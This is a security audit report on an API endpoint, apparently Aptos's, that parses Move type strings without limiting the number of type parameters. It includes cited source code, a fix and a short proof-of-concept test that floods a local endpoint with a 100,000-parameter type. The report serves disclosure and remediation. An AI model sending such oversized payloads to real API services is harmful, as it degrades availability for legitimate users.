# Audit Report

## Title
API Layer Parser Exhaustion via Unbounded Type Parameters in TableItemRequest

## Summary
The `TableItemRequest` API endpoint fails to enforce limits on the number of type parameters during type string parsing, allowing attackers to send malicious requests with hundreds of thousands of type parameters (e.g., `Struct<u64,u64,...,u64>`) that consume excessive memory and CPU resources, potentially degrading API performance or causing service disruption. [1](#0-0) 

## Finding Description

The vulnerability exists in the type string deserialization flow for the `get_table_item` API endpoint. When a user sends a `TableItemRequest`, the `key_type` and `value_type` fields are deserialized from JSON strings into `MoveType` objects. This deserialization calls `parse_type_tag` from the Move parser, which has a recursion depth limit (`MAX_TYPE_TAG_NESTING = 8`) but **no limit on the breadth** (number of type parameters at the same level). [2](#0-1) 

The deserialization process:

1. JSON body is deserialized into `TableItemRequest` at the endpoint
2. `MoveType::deserialize` is called for `key_type` and `value_type`
3. This calls `MoveType::from_str` which invokes `parse_type_tag`
4. The parser tokenizes the string and builds type structures with no breadth limits [3](#0-2) [4](#0-3) 

An attacker can craft a type string like:
```
0x1::module::Struct<u64,u64,u64,...(hundreds of thousands)...,u64>
```

This bypasses the depth limit (depth = 2) while creating massive `Vec<TypeTag>` allocations. The parser's `parse_comma_list` function has no limit on list length: [5](#0-4) 

The only protection is the 8 MB HTTP request body limit, which allows approximately 2 million type parameters (each "u64," is ~4 bytes). This results in:
- **Memory**: ~64-128 MB allocation for 2M `TypeTag` enum instances
- **CPU**: Millions of parser iterations, tokenizations, and allocations [6](#0-5) 

The verification in `TableItemRequest::verify()` only checks recursion depth, not breadth: [7](#0-6) 

## Impact Explanation

This qualifies as **High Severity** under the "API crashes" or "Validator node slowdowns" category:

- **Resource Exhaustion**: Each malicious request allocates 64-128 MB of memory and consumes significant CPU time
- **API Degradation**: Multiple concurrent requests can exhaust the thread pool used by `api_spawn_blocking`
- **Amplification**: No rate limiting exists on the API endpoints, allowing rapid-fire requests [8](#0-7) 

While `api_spawn_blocking` isolates parsing to a thread pool, the thread pool is finite and can be exhausted by concurrent malicious requests, degrading API availability for legitimate users.

## Likelihood Explanation

**High Likelihood**:
- No authentication required for API access
- Trivial to craft malicious payloads
- No rate limiting on table item endpoints
- Attack requires only standard HTTP tools
- The 8 MB request size limit is generous enough for effective attacks

## Recommendation

Implement breadth limits during type tag parsing:

1. **Add Type Parameter Count Limit**: Enforce a maximum number of type arguments per struct (e.g., 32 or 64)

```rust
// In parser.rs parse_type_tag function, when parsing struct type args:
const MAX_TYPE_ARGS: usize = 32;

let ty_args = if self.peek() == Some(&Token::Lt) {
    self.next()?;
    let ty_args = self.parse_comma_list(
        |parser| parser.parse_type_tag(depth + 1),
        Token::Gt,
        true,
    )?;
    
    if ty_args.len() > MAX_TYPE_ARGS {
        bail!("Exceeded maximum type arguments limit: {}", MAX_TYPE_ARGS);
    }
    
    self.consume(Token::Gt)?;
    ty_args
} else {
    vec![]
};
```

2. **Add Early Validation**: Validate type string length in `TableItemRequest::verify()` before parsing

3. **Add Rate Limiting**: Implement per-IP rate limiting on API endpoints

## Proof of Concept

```rust
// Rust test to demonstrate the vulnerability
#[tokio::test]
async fn test_type_parameter_dos() {
    // Create a type string with 100,000 type parameters
    let mut type_str = String::from("0x1::test::Struct<");
    for i in 0..100_000 {
        type_str.push_str("u64");
        if i < 99_999 {
            type_str.push(',');
        }
    }
    type_str.push('>');
    
    // This will allocate massive memory during deserialization
    let json_body = serde_json::json!({
        "key_type": type_str,
        "value_type": "u64",
        "key": {}
    });
    
    // Send to API endpoint - observe memory/CPU spike
    let client = reqwest::Client::new();
    let response = client.post("http://localhost:8080/v1/tables/0x1/item")
        .json(&json_body)
        .send()
        .await
        .unwrap();
    
    // Parser will consume significant resources before responding
}
```

**Notes**

The vulnerability exists because the Move type system's recursion depth limit does not protect against breadth-based attacks. The API layer deserializes user-provided type strings without enforcing limits on the number of type parameters, allowing resource exhaustion attacks within the 8 MB request size constraint. Move bytecode itself has limits on struct fields (255) but no enforced limit on generic type arguments during API-level parsing.

### Citations

**File:** api/types/src/table.rs (L10-16)
```rust
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize, Object)]
pub struct TableItemRequest {
    pub key_type: MoveType,
    pub value_type: MoveType,
    /// The value of the table item's key
    pub key: Value,
}
```

**File:** api/types/src/move_types.rs (L690-714)
```rust
impl VerifyInputWithRecursion for MoveType {
    fn verify(&self, recursion_count: u8) -> anyhow::Result<()> {
        if recursion_count > MAX_RECURSIVE_TYPES_ALLOWED {
            bail!(
                "Move type {} has gone over the limit of recursive types {}",
                self,
                MAX_RECURSIVE_TYPES_ALLOWED
            );
        }
        match self {
            MoveType::Vector { items } => items.verify(recursion_count + 1),
            MoveType::Struct(struct_tag) => struct_tag.verify(recursion_count + 1),
            MoveType::Function { args, results, .. } => {
                for ty in args.iter().chain(results) {
                    ty.verify(recursion_count + 1)?
                }
                Ok(())
            },
            MoveType::GenericTypeParam { .. } => Ok(()),
            MoveType::Reference { to, .. } => to.verify(recursion_count + 1),
            MoveType::Unparsable(inner) => bail!("Unable to parse move type {}", inner),
            _ => Ok(()),
        }
    }
}
```

**File:** api/types/src/move_types.rs (L813-842)
```rust
impl FromStr for MoveType {
    type Err = anyhow::Error;

    fn from_str(mut s: &str) -> Result<Self, Self::Err> {
        let mut is_ref = false;
        let mut is_mut = false;
        if s.starts_with('&') {
            s = &s[1..];
            is_ref = true;
        }
        if is_ref && s.starts_with("mut ") {
            s = &s[4..];
            is_mut = true;
        }
        // Previously this would just crap out, but this meant the API could
        // return a serialized version of an object and not be able to
        // deserialize it using that same object.
        let inner = match parse_type_tag(s) {
            Ok(inner) => (&inner).into(),
            Err(_e) => MoveType::Unparsable(s.to_string()),
        };
        if is_ref {
            Ok(MoveType::Reference {
                mutable: is_mut,
                to: Box::new(inner),
            })
        } else {
            Ok(inner)
        }
    }
```

**File:** api/types/src/move_types.rs (L852-860)
```rust
impl<'de> Deserialize<'de> for MoveType {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: Deserializer<'de>,
    {
        let data = <String>::deserialize(deserializer)
            .map_err(|e| D::Error::custom(format_err!("deserialize Move type failed, {}", e)))?;
        data.parse().map_err(D::Error::custom)
    }
```

**File:** third_party/move/move-core/types/src/parser.rs (L286-341)
```rust
    fn parse_type_tag(&mut self, depth: u8) -> Result<TypeTag> {
        if depth > crate::safe_serialize::MAX_TYPE_TAG_NESTING {
            bail!("Exceeded TypeTag nesting limit during parsing: {}", depth);
        }

        Ok(match self.next()? {
            Token::U8Type => TypeTag::U8,
            Token::U16Type => TypeTag::U16,
            Token::U32Type => TypeTag::U32,
            Token::U64Type => TypeTag::U64,
            Token::U128Type => TypeTag::U128,
            Token::U256Type => TypeTag::U256,
            Token::BoolType => TypeTag::Bool,
            Token::AddressType => TypeTag::Address,
            Token::SignerType => TypeTag::Signer,
            Token::VectorType => {
                self.consume(Token::Lt)?;
                let ty = self.parse_type_tag(depth + 1)?;
                self.consume(Token::Gt)?;
                TypeTag::Vector(Box::new(ty))
            },
            Token::Address(addr) => {
                self.consume(Token::ColonColon)?;
                match self.next()? {
                    Token::Name(module) => {
                        self.consume(Token::ColonColon)?;
                        match self.next()? {
                            Token::Name(name) => {
                                let ty_args = if self.peek() == Some(&Token::Lt) {
                                    self.next()?;
                                    let ty_args = self.parse_comma_list(
                                        |parser| parser.parse_type_tag(depth + 1),
                                        Token::Gt,
                                        true,
                                    )?;
                                    self.consume(Token::Gt)?;
                                    ty_args
                                } else {
                                    vec![]
                                };
                                TypeTag::Struct(Box::new(StructTag {
                                    address: AccountAddress::from_hex_literal(&addr)?,
                                    module: Identifier::new(module)?,
                                    name: Identifier::new(name)?,
                                    type_args: ty_args,
                                }))
                            },
                            t => bail!("expected name, got {:?}", t),
                        }
                    },
                    t => bail!("expected name, got {:?}", t),
                }
            },
            tok => bail!("unexpected token {:?}, expected type tag", tok),
        })
    }
```

**File:** api/src/check_size.rs (L43-58)
```rust
    async fn call(&self, req: Request) -> Result<Self::Output> {
        if req.method() != Method::POST {
            return self.inner.call(req).await;
        }

        let content_length = req
            .headers()
            .typed_get::<headers::ContentLength>()
            .ok_or(SizedLimitError::MissingContentLength)?;

        if content_length.0 > self.max_size {
            return Err(SizedLimitError::PayloadTooLarge.into());
        }

        self.inner.call(req).await
    }
```

**File:** api/src/state.rs (L156-176)
```rust
        table_item_request
            .0
            .verify()
            .context("'table_item_request' invalid")
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code_no_info(err, AptosErrorCode::InvalidInput)
            })?;
        fail_point_poem("endpoint_get_table_item")?;
        self.context
            .check_api_output_enabled("Get table item", &accept_type)?;
        let api = self.clone();
        api_spawn_blocking(move || {
            api.table_item(
                &accept_type,
                table_handle.0,
                table_item_request.0,
                ledger_version.0,
            )
        })
        .await
    }
```
